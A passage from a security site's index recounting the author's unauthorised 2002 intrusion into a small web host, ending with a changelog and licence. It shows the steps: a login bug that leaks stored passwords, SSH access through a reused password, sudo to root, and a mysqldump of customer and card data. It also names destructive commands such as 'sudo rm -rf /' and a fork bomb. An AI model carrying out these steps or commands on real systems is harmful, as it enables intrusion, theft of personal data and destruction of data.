exit;\n} else {\n    /* Show login fields again. */\n?&gt;\n&lt;form&gt;\n    &lt;input type=\"text\" name=\"username\" value=\"&lt;?php echo $username; ?&gt;\" /&gt;\n    &lt;input type=\"password\" name=\"password\" value=\"&lt;?php echo $password; ?&gt;\" /&gt;\n    &lt;input type=\"submit\" value=\"Login\" /&gt;\n&lt;/form&gt;\n&lt;?php\n    exit;\n}\n?&gt;\n</code></pre> <p>However, there was a bug in Stephen's code: rather than using the values pulled from <code>$_POST</code>, he used the values returned by the database:</p> <pre><code>[...]\n$values = mysql_fetch_array($result);\n[...]\n&lt;form&gt;\n    &lt;input type=\"text\" name=\"username\" value=\"&lt;?php echo $values['Username']; ?&gt;\" /&gt;\n    &lt;input type=\"password\" name=\"password\" value=\"&lt;?php echo $values['Password']; ?&gt;\" /&gt;\n    &lt;input type=\"submit\" value=\"Login\" /&gt;\n&lt;/form&gt;\n[...]\n</code></pre> <p>This is an easy mistake to make, and a difficult one to notice when troubleshooting. If my suspicion was correct, all I had to do was enter the correct username, along with an incorrect password, click \"Login,\" then (after the login was rejected) click \"Login\" again, and I'd be authenticated as whichever user I wished.</p> <p>I tried. It worked.</p> <p>10 minutes later I had the passwords for every single user of ScriptSharks.com. I could log in as anyone, and see all the projects they had created on the site.</p> <p>But that wasn't enough. I was feeling euphoric, my confidence boosted by my success. \"How far can I go?\" I thought. \"Can I get root?\"</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#password-reuse","title":"Password Reuse","text":"<p>(MITRE: T1021.004, T1078.003)</p> <p>With a list of valid account credentials, I turned my attention to the SSH server running on port <code>22</code>. These days we consider it bad practice to re-use passwords for multiple accounts. However, back in 2002, password reuse was still quite common, and <code>sglane</code> was no exception.</p> <p>I downloaded PuTTY, an SSH client for Windows, and connected to ScriptSharks.com's SSH server, using the credentials I had recovered for <code>sglane</code>. The credentials worked, and I was presented with a command prompt.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#privilege-escalation","title":"Privilege Escalation","text":"<p>(MITRE: T1548.003)</p> <p>Having gained access to the system as <code>sglane</code>, I wanted to elevate my privileges to <code>root</code>. Since <code>sglane</code> was an admin, I could simply use <code>sudo</code> to obtain root access, providing credentials when prompted:</p> <pre><code>sglane@webserver:~$ sudo su\n[sudo] password for sglane:\nroot@webserver:/home/sglane#\n</code></pre> <p>This worked; I was logged in as <code>root</code>.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#discovery","title":"Discovery","text":"<p>(MITRE: T1003.008, T1518, T1083, T1087.001, T1552.001)</p> <p>After obtaining <code>root</code> access, I explored the system further.</p> <p>Reading the <code>/etc/passwd</code> file revealed the <code>www-data</code> account, which is the default account used by the Apache web server. (I could have also dumped the contents of <code>/etc/shadow</code> to see the password hashes for other accounts, but I did not have access to a password-cracking utility like John the Ripper at the time, so I left the hashes alone.)</p> <p>Looking in the <code>/var/www</code> directory (the default Apache webroot at the time), I discovered that <code>scriptsharks.com</code> had its own subdirectory, along with three others*:</p> <pre><code>root@webserver:/home/sglane# ls -lh /var/www\ntotal 16K\ndrwxr-xr-x 2 root    root 4.0K Aug  9 18:15 onlineshop.com\ndrwxr-xr-x 2 root    root 4.0K Dec 30  2001 phpmyadmin\ndrwxr-xr-x 2 root    root 4.0K May 12 11:05 retailstore.com\ndrwxr-xr-x 2 root    root 4.0K Apr 19 05:02 scriptsharks.com\n</code></pre> <p>* Note: I have long forgotten the domains for the two online shops Stephen managed, so I've used <code>onlineshop.com</code> and <code>retailstore.com</code> as generic substitutions.</p> <p>Stephen was using one server to host ScriptSharks and two online retail stores, as well as the phpMyAdmin web-based MySQL administration tool.</p> <p>Browsing to the <code>scriptsharks.com</code> directory, I found the site's PHP source code, which included database connection credentials. The credentials appeared to be site-specific, with ScriptSharks and the online stores each using a separate account. However, upon visiting the <code>phpMyAdmin</code> service hosted on the website, I was able to authenticate as <code>sglane</code> using the password I'd recovered previously, and was able to access the databases for all three sites.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#collection","title":"Collection","text":"<p>(MITRE: T1005, T1560.001)</p> <p>These databases included tables for user accounts, product information, customer orders, and more. They included cleartext usernames, emails and passwords for all accounts on all three sites, as well as details for every order placed on the two retail sites, including the customer's name, shipping address, and credit card information.</p> <p>If a malicious hacker got access to these records, it could cause serious trouble for Stephen and his online businesses. Fortunately, my motivations were intellectual, not material; I had no interest in abusing the data. Quite the opposite! Following the discovery, I knew I had to talk to Stephen about securing his websites.</p> <p>My predicament was this: How do I reveal the vulnerabilities in Stephen's websites so he'll take me seriously, without compromising system security, and without getting arrested for computer crimes? At the time, the concept of Coordinated Vulnerability Disclosure was not yet widely known, despite the fact that vulnerability disclosure had been a subject of heated debate since the 1800s.</p> <p>I weighed my options: If I claimed I had hacked his site without providing proof, he would dismiss my claims. What proof would suffice? A dump of the database would be sufficient; it would demonstrate that sensitive data was accessed, giving credibility to my claims. So I used <code>mysqldump</code> to export all databases to a single file:</p> <pre><code>root@webserver:/home/sglane# mysqldump --all-databases -u sglane -p secretpassword &gt; /home/sglane/databases.sql\n</code></pre> <p>The resulting file was quite large, so I compressed it with <code>zip</code>, encrypting the contents with a password\u2014the same password used to authenticate with the <code>sglane</code> account:</p> <pre><code>root@webserver:/home/sglane# zip -p secretpassword databases.zip databases.sql\n</code></pre> <p>I had my proof; now I needed to consider how to provide it. Malicious attackers would simply exfiltrate the file, eager to sell the data to credit fraudsters or cash-in themselves. However, I did not want the data to leave the system; not only would this look bad for me\u2014committing actual data theft would undermine any ethical defense I could build\u2014but it would also be a security risk for Stephen and his business. As it stood, the only way to steal the data would be to attack Stephen's systems. But if the same data were also on my own system or stored on the 'net somewhere, then the data would be at even greater risk of compromise simply by existing in multiple places.</p> <p>Rather than exfiltrate the data prior to disclosure, I simply left the encrypted <code>databases.zip</code> file in Stephen's home directory, and deleted the original <code>databases.sql</code> dump file. Then I began drafting an email, letting Stephen know I had discovered vulnerabilities on his server, and had left the <code>databases.zip</code> file in his home directory as proof\u2014encrypted with his own secret password. This way, I didn't have to transmit the password via email; I could simply say \"use the same password you use everywhere else.\" Using his own password to encrypt the dump file provided additional proof of compromise.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#impact","title":"Impact","text":"<p>(MITRE: T1485, T1489, T1491, T1499, T1529, T1531, T1561, T1565.001)</p> <p>While my intentions were never malicious, I was sure to outline some of the risks inherent in the vulnerabilities I'd discovered. For example, there was the obvious risk of credit card fraud and identity theft from the customer data, but that was just the tip of the iceberg.</p> <p>With access to the database, attackers could modify data. They could delete legitimate orders, or lock people out of their accounts. They could alter orders, rerouting legitimate purchases to the attackers' address. They could change prices, alter inventory levels, or double-charge customers. They could create new orders, mark them as paid but not shipped, and obtain free products from Stephen's stores. Or they could mark products as returned, but not yet refunded, and steal money.</p> <p>Looking beyond the database, it would also be possible for attackers to deface Stephen's websites, alter their source code, host and transmit malicious code or other illicit data, use the site to conduct a phishing attack, and even use the site as a C2 server for a malware botnet.</p> <p>If they're feeling destructive, attackers could use <code>sudo rm -rf /</code> command to wipe the server's filesystem. Or a fork-bomb could cause the system to become non-responsive. Or, if they're feeling lazy, they could simply <code>sudo shutdown -h now</code> to take the server offline.</p> <p>But the impact wasn't limited to Stephen's systems. Stephen liked to re-use the same password across multiple accounts, and he wasn't alone. Doubtless many of his websites' users did the same. With access to the database of usernames and their associated email addresses and passwords, attackers could abuse this habit to gain unauthorized access to the external email accounts of Stephen's users. With this access, users could potentially defraud those users further, stealing sensitive data, gaining access to other accounts and services (such as online banking), and even using their legitimate email accounts for phishing attacks.</p> <p>The possibilities were endless! And I made sure Stephen knew about them.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#aftermath","title":"Aftermath","text":"<p>After composing my email to Stephen, the adrenaline from my exploits had faded, and the reality of the situation began to set in. In my excitement and curiosity, I hadn't given much thought to the consequences of my actions. After writing about all the ways people might exploit Stephen's websites, I realized the risk I was taking, and considered whether to send the email or just wipe my tracks, deleting all evidence of my intrusion and pretending I'd never found the site.</p> <p>While the \"wipe my tracks\" option looked appealing, my decision was influenced by two core assumptions:</p> <ul> <li>Everyone is smarter than me.</li> <li>Second, I assume I'm never the first to discover anything.</li> </ul> <p>If I tried to cover my tracks, Stephen would find some logfile or other overlooked evidence of my intrusion. Even the act of covering one's tracks creates more tracks. Assuming that Stephen was smarter than me, I could not hope to hide my intrusion. I would be caught, one way or another.</p> <p>But what if I knew I wouldn't get caught? I could still walk away as if I had never found the site, right? This is where the 2nd assumption comes in. Having discovered these vulnerabilities in Stephen's websites, I had to assume that someone else had discovered them first. This presented an ethical dilemma: Could I ignore the vulnerabilities, knowing that someone else could already be abusing them?</p> <p>Consider the following (hypothetical) scenario: Say you're a tourist visiting the Eiffel Tower, and while leaning against the rail to snap a photo, you accidentally dislodge the railing. Looking at the damage, you realize that the rail could easily fall off, and if someone were to lean on it, they could potentially fall to their death.</p> <p>If you report the broken railing, you might be accused of causing the damage. But if you don't report the damage, someone could get hurt or die. Therefore, despite the personal risk, the only ethical option would be to report the faulty railing, so that it could be repaired, and nobody would get hurt.</p> <p>Likewise, despite the personal risk inherent in disclosure, I felt I could not ethically ignore the vulnerabilities in Stephen's websites, knowing that they could lead to great harm to Stephen and his users.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#disclosure","title":"Disclosure","text":"<p>My heart raced as I clicked \"send\" on the email. Shortly after, the bell rang for lunch. As I ate, I considered the very real possibility that I could be arrested for computer crimes. Despite my intentions, and my efforts to alert Stephen to the vulnerabilities in his systems, I could still go to jail. I had heard of minors being arrested and tried as adults. How would I survive incarceration? How would I explain this to my parents? My actions were indelible. The ball was in Stephen's court. All I could do was wait.</p> <p>Suffice to say, it was a very anxious lunch.</p> <p>Upon my return, I checked my inbox, and found an email from Stephen. He was, understandably, irate. He'd been having a pretty good day until I came along. Now he had a security incident on his hands, which could impact his reputation and his career. He felt endangered, and reacted defensively, threatening litigation against me.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#remediation","title":"Remediation","text":"<p>It appeared my worst fears were coming true. Still, I felt disclosure was the right course of action. </p> <p>I explained as much in my response, and offered my advice on how to fix the vulnerabilities and improve his code security. I also encouraged him to implement better password hygeine, both in his databases and with his personal accounts. Finally, I reminded him of a few important details which, I hoped, would dissuade legal recourse:</p> <ol> <li>I had taken no harmful actions on his system, and had not only disclosed the vulnerabilities, but provided solutions.</li> <li>As a minor, I would likely receive a lighter sentence than an adult in my position.</li> <li>At least one of the web-shops Stephen operated was for a business based in California.</li> </ol> <p>California law requires businesses to notify users whose unencrypted personal information may have been acquired by an unauthorized person. If Stephen took me to court for unauthorized access, he'd force the businesses whose websites he hosted to disclose the breach to their customers. This would cause a pile of problems for Stephen and his business clients. The businesses would suffer financial losses, and Stephen would incur damage to his reputation and career.</p> <p>It seemed like a lot of unnecessary hassle, from my perspective, when instead Stephen could simply fix the bugs, change his passwords, and get on with his life.</p> <p>I was glad to see that he agreed. The last email he sent was brief, effectively saying \"I'll drop it this time. Don't hack me again.\" Not long after\u2014some time between December 31, 2003 and February 6, 2004\u2014Stephen restructured his website, taking down the insecure project-management service altogether, and rearranging existing articles and projects to fill the space.</p> <p>I never heard from him again, but I never forgot about Stephen, nor about ScriptSharks. My experience with him encouraged me to keep learning, keep hacking, and keep working to improve security for everyone. Though he never knew it, Stephen had a significant impact on my life.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#retrospect","title":"Retrospect","text":"<p>Over the years that followed, I checked in on ScriptSharks now and then. I watched as the site evolved, though activity dwindled. Stephen's last major revision to the site was around December 3, 2004, after which point he only updated the site a few times, usually to update the copyright date. In 2007, Stephen stripped the news section from his site.</p> <p>In 2011, the site was host to some Japanese domain-parking page. In 2013 it appeared that ScriptSharks may make a comeback, but in 2016 the site went offline, never to return.</p> <p>Around that time, I was working as a long-haul trucker, making deliveries coast-to-coast. Despite my decades-long passion for coding and hacking, I had never considered myself good enough to \"go pro.\" But in my down-time on the road, I connected with a group of hackers online, many of whom worked in the industry. After observing my skills, they urged me to pursue a career as a penetration tester. In 2019, I left trucking and obtained my OSCP. In 2020, I was hired as an entry-level security analyst.</p> <p>Before long, I was teaching new analysts about pentesting methods and techniques. Each time I taught a team about SQLi, I would tell them the story of ScriptSharks.com, and how Stephen and his website had inspired me. As analysts, my students had been taught \"zero trust,\" and were encouraged to fact-check everything. My story was no exception.</p> <p>This is how, in 2021, I discovered that Stephen had passed away the previous year. One of my students, Googling for Stephen's name, found his obituary on a local news website. I was saddened at the news. While I had never known Stephen personally, I had thought about him often. It was odd, feeling such a connection with someone I barely knew.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FD%20Origins/#rebirth","title":"Rebirth","text":"<p>In 2022, thinking back on Stephen's passing, I wondered: Who owns ScriptSharks.com now? I assumed it would have been bought up right away, but I was wrong. When I looked, the domain was for sale!</p> <p>So I bought it. I didn't want it to fall in the hands of a domain-squatter with no appreciation for the site's history. I wanted to do something useful with it. Something that would respect the site's history, while taking it in a new direction.</p> <p>I took a page from Stephen's book. I decided to channel my passion for malware and security into ScriptSharks.com, sharing my knowledge and experience with the world, just as Stephen had done.</p>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/","title":"Version 0.3.2","text":"<ul> <li>Added a note regarding attribution to the Analysis intro.</li> <li>Updated the Email File analysis section to fix some code issues.</li> <li>Added new content:<ul> <li>HTML and JavaScript analysis.</li> <li>ISO file analysis.</li> <li>Unix <code>file</code> utility.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-031","title":"Version 0.3.1","text":"<ul> <li>Minor revision, enumerating pages.</li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-030","title":"Version 0.3.0","text":"<ul> <li>Added information for HTML, ISO and LNK droppers.<ul> <li>Historical overview.</li> <li>Design walk-through.</li> </ul> </li> <li>Restructured the page a bit.</li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-023","title":"Version 0.2.3","text":"<ul> <li>Added the Design, Analysis and Resources sections.<ul> <li>Includes information about hypervisors and basic toolsets.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-022","title":"Version 0.2.2","text":"<ul> <li>Added \"Ransomware Rising\" section.<ul> <li>This covers the 10s.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-021","title":"Version 0.2.1","text":"<ul> <li>Added \"Millenial Malware\" section.<ul> <li>This covers the 00s.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-020","title":"Version 0.2.0","text":"<ul> <li>Added \"ScriptSharks Origins\" article to the \"About\" section.</li> <li>Updated project organization.</li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-014","title":"Version 0.1.4","text":"<ul> <li>Fixed a typo in the \"Malware Explosion\" section.</li> <li>Added \"Polymorphs, Macros and RATs! (Oh My!)\" section.<ul> <li>This covers the 90s.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#version-013","title":"Version 0.1.3","text":"<ul> <li>Added \"Malware Explosion\" section.<ul> <li>This covers the 80s.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FE%20Changelog/#older-versions","title":"Older Versions","text":"<ul> <li>0.1.*<ul> <li>0.1.2<ul> <li>Expanded \"In the Beginning\" section.</li> <li>Cited Wikipedia in the Introduction.</li> </ul> </li> <li>0.1.1<ul> <li>Fixed bugs.</li> <li>Updated changelog organization.</li> </ul> </li> <li>0.1.0<ul> <li>Created history section.</li> <li>Updated project organization.</li> </ul> </li> </ul> </li> <li>0.0.*<ul> <li>0.0.1<ul> <li>Initial content and configuration.</li> </ul> </li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0xF0%20About/FF%20License/","title":"License","text":"<p>This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License. The author has granted others the freedom to share and adapt this work as long as they respect the terms of the aforementioned license, as detailed in the official text of the license.</p>"}]}